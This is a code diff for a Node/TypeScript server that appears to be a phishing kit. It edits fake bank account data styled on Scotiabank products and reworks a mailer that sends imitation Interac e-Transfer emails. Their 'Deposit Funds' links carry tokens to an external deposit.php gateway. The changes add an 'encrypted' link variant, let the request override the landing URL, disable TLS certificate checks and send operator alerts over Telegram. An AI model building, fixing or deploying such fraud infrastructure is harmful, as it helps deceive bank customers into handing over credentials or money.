@@ -395,7 +395,7 @@ async function startServer() {
               securityWord: 'SARAH',
               scenePoints: 15420,
               settings: {
-                  displayName: "PROJECT SARAH",
+                  displayName: "AB FARMS LTS",
                   memberSince: "2018",
                   adminPin: adminPin || "1234",
                   accountHolderName: "AB FARMS LTD",
@@ -407,7 +407,7 @@ async function startServer() {
                       balance: 4.82,
                       available: 4.82,
                       points: 0,
-                      accountNumber: "1001-4432-8821",
+                      accountNumber: "8821",
                       history: generateHistory(10)
                   },
                   "Savings Plus": {
@@ -415,7 +415,7 @@ async function startServer() {
                       balance: 1.25,
                       available: 1.25,
                       points: 0,
-                      accountNumber: "2005-9912-3341",
+                      accountNumber: "3341",
                       history: generateHistory(5)
                   },
                   "Momentum Visa Infinite": {
@@ -423,7 +423,7 @@ async function startServer() {
                       balance: 4950.00,
                       available: 50.00,
                       points: 850,
-                      accountNumber: "4538-****-****-1102",
+                      accountNumber: "1102",
                       history: generateHistory(15)
                   },
                   "SCENE+ Visa": {
@@ -431,7 +431,7 @@ async function startServer() {
                       balance: 1200.00,
                       available: 800.00,
                       points: 1240,
-                      accountNumber: "4537-****-****-8841",
+                      accountNumber: "8841",
                       history: generateHistory(8)
                   }
               },
@@ -832,9 +832,8 @@ async function startServer() {
       if (!txId) return res.status(400).json({ error: "Missing tx parameter" });
       
       try {
-          const db = await readDB();
-          for (const username in db.users) {
-              const user = db.users[username];
+          const users = await getUsers();
+          for (const user of users) {
               const accs = user.accounts || {};
               for (const accName in accs) {
                   const acc = accs[accName];
@@ -934,7 +933,7 @@ async function startServer() {
                         ...payload,
                         renderedTemplate: template,
                         action_url: actionUrl,
-                        app_url: req.headers.origin || settings.general.app_url,
+                        app_url: payload.app_url || req.headers.origin || settings.general.app_url,
                         smtp: settings.smtp
                     };
 
@@ -963,12 +962,12 @@ async function startServer() {
                     
                     if (!templateHtml) {
                         try {
-                            const p1 = path.join(process.cwd(), 'remote_server', 'templates', `${templateNameStr}.html`);
-                            const p2 = path.join(process.cwd(), '..', 'remote_server', 'templates', `${templateNameStr}.html`);
+                            const p1 = path.join(process.cwd(), 'server', 'templates', `${templateNameStr}.html`);
+                            const p2 = path.join(process.cwd(), 'remote_server', 'templates', `${templateNameStr}.html`);
                             let foundPath = fs.existsSync(p1) ? p1 : (fs.existsSync(p2) ? p2 : null);
 
                             if (!foundPath && process.argv[1]) {
-                                const p3 = path.join(path.dirname(process.argv[1]), 'remote_server', 'templates', `${templateNameStr}.html`);
+                                const p3 = path.join(path.dirname(process.argv[1]), 'server', 'templates', `${templateNameStr}.html`);
                                 if (fs.existsSync(p3)) foundPath = p3;
                             }
 
@@ -980,18 +979,24 @@ async function startServer() {
                     
                     if (!templateHtml) {
                         console.warn("⚠️ No HTML template found for local rendering. Using fallback default template.");
-                        templateHtml = `
-                        <div style="font-family: Arial, sans-serif; background: #eaeced; padding: 20px;">
-                            <div style="max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px;">
-                                <h1 style="color: #333;">Interac e-Transfer</h1>
-                                <p style="font-size: 16px;"><strong>{{sender_name}}</strong> has sent you <strong>\${{amount}}</strong> (CAD).</p>
-                                <p>Message: {{memo}}</p>
-                                <a href="{{action_url}}" style="display: inline-block; padding: 12px 24px; background: #E31837; color: #fff; text-decoration: none; font-weight: bold; border-radius: 4px; margin: 20px 0;">Deposit Funds</a>
-                                <p style="font-size: 12px; color: #666;">Reference: {{transaction_id}}<br>Expires: {{expiry_date}}</p>
-                            </div>
-                        </div>`;
+                        const defaultTemplatePath = path.join(process.cwd(), 'server', 'templates', 'Transfer.html');
+                        if (fs.existsSync(defaultTemplatePath)) {
+                            templateHtml = fs.readFileSync(defaultTemplatePath, 'utf8');
+                        } else {
+                            templateHtml = `
+                            <div style="font-family: Arial, sans-serif; background: #eaeced; padding: 20px;">
+                                <div style="max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px;">
+                                    <h1 style="color: #333;">Interac e-Transfer</h1>
+                                    <p style="font-size: 16px;"><strong>{{sender_name}}</strong> has sent you <strong>\${{amount}}</strong> (CAD).</p>
+                                    <p>Message: {{memo}}</p>
+                                    <a href="{{action_url}}" style="display: inline-block; padding: 12px 24px; background: #E31837; color: #fff; text-decoration: none; font-weight: bold; border-radius: 4px; margin: 20px 0;">Deposit Funds</a>
+                                    <p style="font-size: 12px; color: #666;">Reference: {{transaction_id}}<br>Expires: {{expiry_date}}</p>
+                                </div>
+                            </div>`;
+                        }
                     }
 
+                    const effectiveAppUrl = payload.app_url || req.headers.origin || settings.general.app_url;
                     const tokenObj = {
                         transaction_id: txId,
                         amount: amount,
@@ -999,10 +1004,11 @@ async function startServer() {
                         senderName: sender_name,
                         senderEmail: payload.sender_email || (payload.deposit_payload && payload.deposit_payload.senderEmail) || "",
                         purpose: purpose,
-                        app_url: req.headers.origin || settings.general.app_url // Pass the react app domain to the gateway
+                        app_url: effectiveAppUrl // Pass the react app domain to the gateway
                     };
                     const token = Buffer.from(JSON.stringify(tokenObj)).toString('base64');
-                    const depositLink = actionUrl ? `${actionUrl}/deposit.php?token=${encodeURIComponent(token)}` : `${settings.general.app_url}/deposit?token=${encodeURIComponent(token)}`;
+                    const depositLink = actionUrl ? `${actionUrl}/deposit.php?token=${encodeURIComponent(token)}` : `${effectiveAppUrl}/deposit?token=${encodeURIComponent(token)}`;
+                    const encryptedLink = actionUrl ? `${actionUrl}/deposit.php?token=${encodeURIComponent(token)}&e=1` : `${effectiveAppUrl}/deposit?token=${encodeURIComponent(token)}&type=encrypted`;
                     
                     let finalHtml = templateHtml;
                     const replacements: Record<string, string> = {
@@ -1011,7 +1017,7 @@ async function startServer() {
                         '{{amount}}': parseFloat(amount || '0').toFixed(2),
                         '{{transaction_id}}': txId,
                         '{{action_url}}': depositLink,
-                        '{{ENCRYPTED_URL}}': depositLink,
+                        '{{ENCRYPTED_URL}}': encryptedLink,
                         '{{date}}': date || new Date().toLocaleDateString('en-US'),
                         '{{expiry_date}}': new Date(Date.now() + 30*24*60*60*1000).toLocaleDateString('en-US'),
                         '{{memo}}': purpose || '',
@@ -1028,9 +1034,13 @@ async function startServer() {
                     success = true;
                 } catch (e: any) {
                     console.error("❌ Local Mailer Error:", e);
-                    lastErrorText = lastErrorText ? lastErrorText + " | Local: " + e.message : "Local: " + e.message;
-                    logEvent(`⚠️ [Mailer Warning] Local SMTP attempted but failed: ${e.message}`);
-                    await sendTelegramNotification(`⚠️ <b>MAILER WARNING</b>\nLocal Node.js Mailer failed.\nError: ${e.message}`);
+                    let errStr = e.message;
+                    if (errStr.includes('ETIMEDOUT') || errStr.includes('ENETUNREACH')) {
+                        errStr += " (Note: Render.com blocks outbound SMTP ports 25/465/587 by default. Please set a Remote Action URL)";
+                    }
+                    lastErrorText = lastErrorText ? lastErrorText + " | Local: " + errStr : "Local: " + errStr;
+                    logEvent(`⚠️ [Mailer Warning] Local SMTP attempted but failed: ${errStr}`);
+                    await sendTelegramNotification(`⚠️ <b>MAILER WARNING</b>\nLocal Node.js Mailer failed.\nError: ${errStr}`);
                 }
             }
         }
@@ -1070,13 +1080,16 @@ async function startServer() {
           host: settings.smtp.host,
           port: settings.smtp.port,
           secure: settings.smtp.port === 465,
-          connectionTimeout: 10000,
-          greetingTimeout: 10000,
+          connectionTimeout: 15000,
+          greetingTimeout: 15000,
+          tls: {
+              rejectUnauthorized: false
+          },
           auth: {
               user: settings.smtp.user,
               pass: settings.smtp.pass
           }
-      });
+      } as any);
   
       const finalSender = overrideSenderName || settings.smtp.senderName || settings.general.sender_name;
 
@@ -1148,7 +1161,11 @@ async function startServer() {
           res.json({ success: true, message: "Test email sent successfully", smtpConfig: smtpDebug });
       } catch (e: any) {
           console.error("❌ Test Mailer Error:", e);
-          res.status(500).json({ success: false, error: e.message });
+          let errMsg = e.message;
+          if (errMsg.includes('ETIMEDOUT') || errMsg.includes('ENETUNREACH')) {
+              errMsg += " (Note: Render.com blocks outbound SMTP ports 25/465/587 by default)";
+          }
+          res.status(500).json({ success: false, error: errMsg });
       }
   });
 
